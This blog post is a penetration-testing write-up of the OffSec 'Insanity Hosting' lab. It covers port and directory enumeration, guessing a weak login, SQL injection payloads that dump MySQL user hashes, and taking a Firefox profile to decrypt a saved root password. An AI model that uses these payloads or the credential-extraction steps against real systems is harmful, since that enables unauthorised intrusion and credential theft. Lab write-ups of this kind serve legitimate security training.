---
title: "Insanity Hosting Writeup"
date: 2025-09-10T07:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab Insanity Hosting Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

**About this lab**
>Engage in enumeration, web enumeration, and exploiting SQL injection techniques to identify vulnerabilities. Utilize password cracking methods and implement privilege escalation strategies to enhance your access. This lab is designed to capitalize on your skills in vulnerability exploitation.

## Enumeration

### Nmap

command
```shell
sudo nmap -p- -T4 target
```
- First, we have to scan all of the target ports.

result
```shell
Host is up (0.10s latency).
Not shown: 65369 filtered tcp ports (no-response), 163 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
- The ftp, ssh, and http ports are open.


command
```shell
sudo nmap -sV -sC -p 21,22,80 -T4 target
```
- Then, enumerate specific information for the open ports.

result
```shell
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can`t get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.45.174
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31:9f (RSA)
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
|_  256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
|_http-title: Insanity - UK and European Servers
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Unix
```
- FTP anonymous login is allowed.

### Gobuster

command
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt -t 50
```
- Using Gobuster, we can perform a web directory brute-force attack.
- We will start from the root directory.

result
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/cgi-bin/             (Status: 403) [Size: 210]
/css                  (Status: 301) [Size: 226] [--> http://target/css/]
/data                 (Status: 301) [Size: 227] [--> http://target/data/]
/fonts                (Status: 301) [Size: 228] [--> http://target/fonts/]
/img                  (Status: 301) [Size: 226] [--> http://target/img/]
/js                   (Status: 301) [Size: 225] [--> http://target/js/]
/licence              (Status: 200) [Size: 57]
/monitoring           (Status: 301) [Size: 233] [--> http://target/monitoring/]
/news                 (Status: 301) [Size: 227] [--> http://target/news/]
/phpmyadmin           (Status: 301) [Size: 233] [--> http://target/phpmyadmin/]
/webmail              (Status: 301) [Size: 230] [--> http://target/webmail/]
```

command
```shell
gobuster dir -u http://target/monitoring/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x .php
```

result
``` shell
tarting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 222]
/.htaccess            (Status: 403) [Size: 222]
/.htaccess.php        (Status: 403) [Size: 226]
/.htpasswd.php        (Status: 403) [Size: 226]
/assets               (Status: 301) [Size: 240] [--> http://target/monitoring/assets/]
/class                (Status: 301) [Size: 239] [--> http://target/monitoring/class/]
/cron.php             (Status: 403) [Size: 221]
/css                  (Status: 301) [Size: 237] [--> http://target/monitoring/css/]
/fonts                (Status: 301) [Size: 239] [--> http://target/monitoring/fonts/]
/images               (Status: 301) [Size: 240] [--> http://target/monitoring/images/]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/js                   (Status: 301) [Size: 236] [--> http://target/monitoring/js/]
/login.php            (Status: 200) [Size: 4848]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/settings             (Status: 301) [Size: 242] [--> http://target/monitoring/settings/]
/smarty               (Status: 301) [Size: 240] [--> http://target/monitoring/smarty/]
/templates            (Status: 301) [Size: 243] [--> http://target/monitoring/templates/]
/templates_c          (Status: 301) [Size: 245] [--> http://target/monitoring/templates_c/]
/vendor               (Status: 301) [Size: 240] [--> http://target/monitoring/vendor/]
Progress: 40938 / 40940 (100.00%)
===============================================================
Finished
===============================================================
```

command
```shell
gobuster dir -u http://target/news -w /usr/share/wordlists/dirb/big.txt -t 50
```

result
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 200) [Size: 5111]
/.htaccess            (Status: 403) [Size: 216]
/.htpasswd            (Status: 403) [Size: 216]
/LICENSE              (Status: 200) [Size: 1083]
/admin                (Status: 301) [Size: 0] [--> http://www.insanityhosting.vm/news/admin/]
/cgi-bin/             (Status: 301) [Size: 0] [--> http://www.insanityhosting.vm/news/cgi-bin]
/robots.txt           (Status: 200) [Size: 22]
/welcome              (Status: 200) [Size: 4514]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

## Exploitation

![ih1.png](images/ih/ih1.png)
- On the news page, we can find the team leader's name: `otis`.

![ih2.png](images/ih/ih2.png)
![ih3.png](images/ih/ih3.png)
![ih5.png](images/ih/ih5.png)
- There are three different login pages, `/monitoring`, `/webmail` and `/news/admin`
- So, we can perform a password cracking attack on these sites using the username `otis`.

### Password Cracking
![ih4.png](images/ih/ih4.png)
- Burp reveals that the `/monitoring` password is `123456`, as the response redirects to `index.php`.
- `123456` is not the password for the `/news` site, but it also works for the `/webmail` site.

![ih6.png](images/ih/ih6.png)
![ih7.png](images/ih/ih7.png)
- In the monitoring service, if we add the wrong hosts, then it will be detected by the server
- If a host is down, then the server sends an email to the `otis` user.

### SQL injection
- On the monitoring page, we can perform an injection by adding a host with a malicious hostname.

```sql
" or 1=1 #
```
![ih8.png](images/ih/ih8.png)
- This payload dumps the entire status table.

```sql
" union select null, null, null, schema_name from information_schema.schemata; #
```
![ih10.png](images/ih/ih10.png)

```sql
" union select 1, user, password, authentication_string from mysql.user; #
```
![ih9.png](images/ih/ih9.png)
- Then we find out the username and hashed password.
- Using `hashes.com`, the root password was not found, but `elliot`'s password was: `elliot123`.

## Privilege Escalation
- The DirtyCOW attack was not applicable, so we have to try another method.

```shell
ls -al
total 16
drwx------. 5 elliot elliot 142 Sep 10 07:46 .
drwxr-xr-x. 7 root   root    76 Aug 16  2020 ..
lrwxrwxrwx. 1 root   root     9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--. 1 elliot elliot  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 elliot elliot 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 elliot elliot 231 Apr  1  2020 .bashrc
drwx------  2 elliot elliot  79 Sep 10 08:00 .gnupg
-rw-r--r--  1 elliot elliot  33 Sep 10 03:30 local.txt
drwx------. 5 elliot elliot  66 Aug 16  2020 .mozilla
drwx------. 2 elliot elliot  25 Aug 16  2020 .ssh
```
- The `.mozilla` directory is found.

```shell
/home/elliot/.mozilla/firefox/esmhp32w.default-default

cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://localhost:10000","httpRealm":null,"formSubmitURL":"https://localhost:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECMXc5x8GLVkkBAh48YcssjnBnQ==","encryptedPassword":"MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPPLux2+J9fKBCApSMIepx/VWtv0rQLkpiuLygt0rrPPRRFoOIlJ40XYbg==","guid":"{0b89dfcb-2db3-499c-adf0-9bd7d87ccd26}","encType":1,"timeCreated":1597591517872,"timeLastUsed":1597595253716,"timePasswordChanged":1597595253716,"timesUsed":2}],"version":2}
```
- Above directory is the firefox profile, and it contains `logins.json`
- Inside the `logins.json` file, there is an encrypted credential.

### firefox_decrypt
[unode/firefox_decrypt: Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles](https://github.com/unode/firefox_decrypt)

```shell
# remote
cp cookies.sqlite key4.db cert9.db logins.json profile/

# local
scp -r elliot@target:/home/elliot/.mozilla/firefox/esmhp32w.default-default/profile ./
```
- we have to get `cookies.sqlite`, `key4.db`, `cert9.db`, `logins.json`

```shell
python3 firefox_decrypt/firefox_decrypt.py profile
2025-09-10 16:24:43,783 - WARNING - profile.ini not found in profile
2025-09-10 16:24:43,783 - WARNING - Continuing and assuming 'profile' is a profile location

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
```
- Then we can decrypt the password using `firefox_decrypt`.

```shell
# remote
su root
Password: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa
```
